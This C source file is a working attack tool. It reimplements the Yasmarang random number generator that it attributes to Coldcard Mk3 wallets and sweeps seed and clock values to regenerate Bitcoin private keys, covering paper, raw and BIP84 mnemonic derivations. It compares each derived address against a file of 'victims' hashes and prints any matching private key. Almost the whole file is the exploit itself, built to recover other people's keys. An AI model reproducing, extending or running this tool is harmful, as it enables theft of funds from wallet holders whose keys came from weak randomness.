// yasmarang_sweep.c — Coldcard Mk3 Yasmarang enum (no UIDs needed).
// state = Yasmarang(pad, RTC->TR, RTC->SSR); pad = UID^SysTick = one u32 swept directly.
// RTC resets to 0 at boot (rtc.c verified) => TR/SSR small windows.
// Modes (per seed): 0=paper priv=sha256d(stream); 1=raw priv=stream;
//   2=BIP84-24; 3=BIP84-12. All derive m/84'/0'/0'/0/0 (paper uses priv directly).
// Usage: yasmarang_sweep <pad_start> <pad_end> <tr_max> <ssr_max> <victims_h160.bin> <mode>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include "pbkdf2.h"
#include <openssl/evp.h>
#include "hmac.h"
#include "sha2.h"
#include "sha3.h"
#include <secp256k1.h>
#include "ripemd160.h"
#include "bip39_english.h"

static secp256k1_context* SECP;

/* ---- Yasmarang (pinned to MicroPython rng.c) ---- */
static uint32_t yas_next(uint32_t st[4]){
    uint32_t pad=st[0], n=st[1], d=st[2]; uint8_t dat=st[3]&0xff;
    pad += dat + d*n;
    pad = (pad<<3) + (pad>>29);
    n = pad|2;
    d ^= (pad<<31) + (pad>>1);
    dat ^= (uint8_t)pad ^ (d>>8) ^ 1;
    st[0]=pad; st[1]=n; st[2]=d; st[3]=dat;
    return pad ^ (d<<5) ^ (pad>>18) ^ (dat<<1);
}
// returns 0 on success, -1 if adjacent-equal chip words (libngu guard trips => not a valid seed)
static int yasmarang_bytes32(uint32_t pad_init, uint32_t tr, uint32_t ssr, uint8_t* out){
    uint32_t chip[4]={pad_init, tr, ssr, 0};
    uint32_t lib[4]={0x0A8CE26F, 69, 233, 0};
    uint32_t last=0; int have=0;
    for(int i=0;i<8;i++){
        uint32_t c=yas_next(chip);
        if(have && c==last) return -1;       // libngu guard: adjacent equal chip TRNG words
        last=c; have=1;
        c ^= yas_next(lib);
        out[i*4+0]=c&0xff; out[i*4+1]=(c>>8)&0xff; out[i*4+2]=(c>>16)&0xff; out[i*4+3]=(c>>24)&0xff;
    }
    return 0;
}

static void sha256d(const uint8_t* in, int len, uint8_t* out){
    uint8_t h[32]; sha256_Raw(in,len,h); sha256_Raw(h,32,out);
}

static void btc_hash160(const uint8_t* priv, uint8_t* out20){
    secp256k1_pubkey pub; secp256k1_ec_pubkey_create(SECP,&pub,priv);
    uint8_t ser[33]; size_t l=33; secp256k1_ec_pubkey_serialize(SECP,ser,&l,&pub,SECP256K1_EC_COMPRESSED);
    uint8_t h[32]; sha256_Raw(ser,33,h); ripemd160(h,32,out20);
}

/* ---- BIP32 (m/84'/0'/0'/0/0) ---- */
static void hmac512(const uint8_t* key,int kl,const uint8_t* data,int dl,uint8_t* out){
    HMAC_SHA512_CTX ctx; hmac_sha512_Init(&ctx,key,kl); hmac_sha512_Update(&ctx,data,dl); hmac_sha512_Final(&ctx,out);
}
static int ckd(uint8_t* k, uint8_t* chain, uint32_t idx){
    uint8_t data[37]; int dl;
    if(idx&0x80000000u){ data[0]=0; memcpy(data+1,k,32); dl=33; }
    else {
        secp256k1_pubkey pub; secp256k1_ec_pubkey_create(SECP,&pub,k);
        size_t l=33; secp256k1_ec_pubkey_serialize(SECP,data,&l,&pub,SECP256K1_EC_COMPRESSED); dl=33;
    }
    uint8_t bb[4]={ (idx>>24)&0xff,(idx>>16)&0xff,(idx>>8)&0xff,idx&0xff };
    memcpy(data+dl,bb,4); dl+=4;
    uint8_t I[64]; hmac512(chain,32,data,dl,I);
    if(!secp256k1_ec_seckey_verify(SECP,I)) return -1;
    if(!secp256k1_ec_seckey_tweak_add(SECP,k,I)) return -1;
    memcpy(chain,I+32,32); return 0;
}

/* ---- mnemonic (12 or 24) ---- */
static void entropy_to_words(const uint8_t* ent, int nwords, char* out){
    int entbits = (nwords==12)?128:256;
    int csbits = entbits/32;
    int totalbits = entbits+csbits;
    uint8_t csfull[32]; sha256_Raw(ent,entbits/8,csfull);
    out[0]=0; int bitpos=0;
    for(int w=0; w<nwords; w++){
        int idx=0;
        for(int b=0;b<11;b++){
            int bytei,biti,v;
            if(bitpos<entbits){ bytei=bitpos/8; biti=7-(bitpos%8); v=(ent[bytei]>>biti)&1; }
            else { int cp=bitpos-entbits; bytei=cp/8; biti=7-(cp%8); v=(csfull[bytei]>>biti)&1; }
            idx=(idx<<1)|v; bitpos++;
        }
        strcat(out, wordlist[idx]); if(w<nwords-1) strcat(out," ");
    }
}

/* ---- oracle ---- */
static uint8_t* victims; static size_t nvict;
static int cmp20(const void*a,const void*b){ return memcmp(a,b,20); }
static int is_victim(const uint8_t* a){ return bsearch(a,victims,nvict,20,cmp20)!=NULL; }

int main(int argc,char**argv){
    if(argc<7){ fprintf(stderr,"usage: yasmarang_sweep <pad0> <pad1> <tr_max> <ssr_max> <h160.bin> <mode>\n"); return 2; }
    SECP=secp256k1_context_create(SECP256K1_CONTEXT_NONE);
    uint32_t pad0=(uint32_t)strtoul(argv[1],0,0), pad1=(uint32_t)strtoul(argv[2],0,0);
    uint32_t tr_max=(uint32_t)strtoul(argv[3],0,0), ssr_max=(uint32_t)strtoul(argv[4],0,0);
    int mode=atoi(argv[6]);
    FILE*f=fopen(argv[5],"rb"); if(!f){ fprintf(stderr,"no oracle\n"); return 2; }
    fseek(f,0,SEEK_END); long sz=ftell(f); fseek(f,0,SEEK_SET);
    nvict=sz/20; victims=malloc(sz); fread(victims,20,nvict,f); fclose(f);
    qsort(victims,nvict,20,cmp20);
    fprintf(stderr,"oracle=%zu pad[%u,%u) tr<=%u ssr<=%u mode=%d\n",nvict,pad0,pad1,tr_max,ssr_max,mode);

    uint8_t stream[32], priv[32], h160[20];
    const uint32_t H=0x80000000u;
    uint32_t path84[5]={84+H,0+H,0+H,0,0};
    unsigned long checked=0;
    uint32_t tr_step = tr_max ? (tr_max/8 + 1) : 1;
    uint32_t ssr_step = ssr_max ? (ssr_max/8 + 1) : 1;
    for(uint32_t pad=pad0; pad<pad1; pad++){
        for(uint32_t tr=0; tr<=tr_max; tr+=tr_step){
            for(uint32_t ssr=0; ssr<=ssr_max; ssr+=ssr_step){
                if(yasmarang_bytes32(pad, tr, ssr, stream)!=0) continue;  // libngu guard tripped
                if(mode==0){ sha256d(stream,32,priv); }
                else if(mode==1){ memcpy(priv,stream,32); }
                else { // BIP84
                    uint8_t entropy[32]; sha256d(stream,32,entropy);
                    uint8_t* ent = entropy; int nw = (mode==3)?12:24;
                    if(nw==12){} // use first 16 via entbits logic
                    char mn[800];
                    if(nw==12){ entropy_to_words(ent,12,mn); }
                    else { entropy_to_words(ent,24,mn); }
                    uint8_t seed64[64];
                    PKCS5_PBKDF2_HMAC(mn,strlen(mn),(const unsigned char*)"mnemonic",8,2048,EVP_sha512(),64,seed64);
                    uint8_t I[64]; hmac512((const uint8_t*)"Bitcoin seed",12,seed64,64,I);
                    uint8_t k[32],chain[32]; memcpy(k,I,32); memcpy(chain,I+32,32);
                    for(int i=0;i<5;i++) if(ckd(k,chain,path84[i])){ k[0]=0; break; }
                    memcpy(priv,k,32);
                }
                if(!secp256k1_ec_seckey_verify(SECP,priv)) continue;
                if(pad==pad0 && tr==0 && ssr==0){
                    fprintf(stderr,"DEBUG priv(mode=%d pad=0)=",mode);
                    for(int i=0;i<32;i++) fprintf(stderr,"%02x",priv[i]);
                    fprintf(stderr,"\n");
                }
                btc_hash160(priv,h160);
                checked++;
                if(is_victim(h160)){
                    printf("HIT pad=%u tr=%u ssr=%u mode=%d priv=",pad,tr,ssr,mode);
                    for(int i=0;i<32;i++) printf("%02x",priv[i]);
                    printf(" h160="); for(int i=0;i<20;i++) printf("%02x",h160[i]);
                    printf("\n"); fflush(stdout);
                }
            }
        }
        if((pad-pad0)%0x1000000==0 && pad>pad0) fprintf(stderr,"  progress pad=%u checked=%lu\n",pad,checked);
    }
    fprintf(stderr,"DONE checked=%lu\n",checked);
    return 0;
}
